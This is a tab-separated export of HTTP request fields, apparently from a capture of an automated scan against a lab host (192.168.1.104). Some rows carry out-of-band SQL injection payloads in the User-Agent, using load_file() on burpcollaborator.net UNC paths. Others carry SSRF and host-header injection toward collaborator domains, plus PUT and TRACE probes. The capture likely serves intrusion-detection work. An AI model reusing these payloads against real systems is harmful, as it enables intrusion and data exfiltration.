http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			(select load_file('\\\\yrtqzaond5qsukwl5x0n6v2hw825qvemgabx1lq.burpcollaborator.net\\qta'))				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'+(select load_file('\\\\1nptvdkq98mvqnso10wq2yyksby8myapdd80yon.burpcollaborator.net\\qrg'))+'				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			3qbfm2asmo				/web
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/crossdomain.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/crossdomain.xml
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/clientaccesspolicy.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/clientaccesspolicy.xml
											no-cache, no-transform						close										cm24uoj18jl6pyrz0bv119xvrmxjlb93br1er2g.burpcollaborator.net															1	http://cm24uoj18jl6pyrz0bv119xvrmxjlb93br1er2g.burpcollaborator.net/		GET				HTTP/1.1																							/
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/trace.axd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/trace.axd
*/*	gzip, deflate	en															close		10	10							192.168.1.104															1	http://192.168.1.104/zgtizedbx3.txt		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/zgtizedbx3.txt
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/		TRACE				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36			eq73d2ou5e	/
											no-cache, no-transform						close										r5xjd32gry4l8daejqegkogaa1gy4osgu4krafz.burpcollaborator.net															1	http://r5xjd32gry4l8daejqegkogaa1gy4osgu4krafz.burpcollaborator.net/		GET				HTTP/1.1																							/
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/		TRACE				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36			7zkxgg2zrb	/
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/clientaccesspolicy.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/clientaccesspolicy.xml
*/*	gzip, deflate	en															close		10	10							192.168.1.104															1	http://192.168.1.104/zgtizedbx3.txt		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/zgtizedbx3.txt
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/trace.axd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/trace.axd
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/crossdomain.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/crossdomain.xml
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/clientaccesspolicy.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/clientaccesspolicy.xml
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/		TRACE				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36			zusq8fazb9	/
*/*	gzip, deflate	en															close		10	10							192.168.1.104															1	http://192.168.1.104/zgtizedbx3.txt		PUT				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/zgtizedbx3.txt
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										99g1hl6yvg83cvewn8iyo6ksejkg87wzynoaey3.burpcollaborator.net															1	http://99g1hl6yvg83cvewn8iyo6ksejkg87wzynoaey3.burpcollaborator.net/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/trace.axd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/trace.axd
*/*	gzip, deflate	en															close										192.168.1.104															1	http://192.168.1.104/crossdomain.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/crossdomain.xml
											no-cache, no-transform						close										192.168.1.104:80@6nuyvikv9dm0qsst15wv23ypsgydm3aw0kq7gv5.burpcollaborator.net															1	http://192.168.1.104:80@6nuyvikv9dm0qsst15wv23ypsgydm3aw0kq7gv5.burpcollaborator.net/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										192.168.1.104:80@mrhezyobdtqgu8w95l0b6j25ww2tqlee42upkd9.burpcollaborator.net															1	http://192.168.1.104:80@mrhezyobdtqgu8w95l0b6j25ww2tqlee42upkd9.burpcollaborator.net/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104@gue82sr5gntax2z38f359d5zzq5ntdh5mtcg24r.burpcollaborator.net/		GET				HTTP/1.1																							@gue82sr5gntax2z38f359d5zzq5ntdh5mtcg24r.burpcollaborator.net/
											no-cache, no-transform						close										192.168.1.104:80@awa24mtzihv4zw1xa95zb77t1k7hv8j19pzcp0e.burpcollaborator.net															1	http://192.168.1.104:80@awa24mtzihv4zw1xa95zb77t1k7hv8j19pzcp0e.burpcollaborator.net/		GET				HTTP/1.1																							/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104@o1qg90ydnv0i4a6bfnadglc76ycv0noft3jq9ey.burpcollaborator.net/		GET				HTTP/1.1																							@o1qg90ydnv0i4a6bfnadglc76ycv0noft3jq9ey.burpcollaborator.net/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104http://gcw8ks95ynbaf2h3qfl5rdnzhqnnbdz53ttgj48.burpcollaborator.net/		GET				HTTP/1.1																							http://gcw8ks95ynbaf2h3qfl5rdnzhqnnbdz53ttgj48.burpcollaborator.net/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104@njafrzgc5uihm9oaxmscyku6oxuuil6db11orcg.burpcollaborator.net/		GET				HTTP/1.1																							@njafrzgc5uihm9oaxmscyku6oxuuil6db11orcg.burpcollaborator.net/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104http://5w2x4htuicvzzr1sa45ub27o1f7cv4jwnkd73vs.burpcollaborator.net/		GET				HTTP/1.1																							http://5w2x4htuicvzzr1sa45ub27o1f7cv4jwnkd73vs.burpcollaborator.net/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104http://wffon8cl13eqiikjtvolutqfk6q3eu2m6awxmlb.burpcollaborator.net/		GET				HTTP/1.1																							http://wffon8cl13eqiikjtvolutqfk6q3eu2m6awxmlb.burpcollaborator.net/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
											no-cache, no-transform						close										192.168.1.104														http://8u302krxgft2xuzv873x955rzi5ft7h0co2bszh.burpcollaborator.net/	1	http://192.168.1.104/		GET				HTTP/1.1																					5rxxzhoudcqzurws540u622owf2cq4ex6lw8mwb.burpcollaborator.net		/
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104749zcj1wqe317t9ui6dwj4fq9hfe36rzin8ayyn.burpcollaborator.net:443		CONNECT				HTTP/1.1																							749zcj1wqe317t9ui6dwj4fq9hfe36rzin8ayyn.burpcollaborator.net:443
											no-cache, no-transform						close										192.168.1.104														http://1wyt4dtqi8vvzn1oa05qby7k1b78vyjref42uqj.burpcollaborator.net/	1	http://192.168.1.104/		GET				HTTP/1.1																					ytvq1aqnf5sswkyl7x2n8v4hy845svgo8cyzond.burpcollaborator.net		/
*/*	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														http://192.168.1.104/noindex/css/open-sans.css	1	http://192.168.1.104/noindex/css/fonts/Light/OpenSans-Light.woff		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/noindex/css/fonts/Light/OpenSans-Light.woff
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
											no-cache, no-transform						close										192.168.1.104															1	http://192.168.1.104rvqj33sghyulyd0e9q4gao6a016yuoih95zspge.burpcollaborator.net:443		CONNECT				HTTP/1.1																							rvqj33sghyulyd0e9q4gao6a016yuoih95zspge.burpcollaborator.net:443
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/robots.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/robots.txt
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
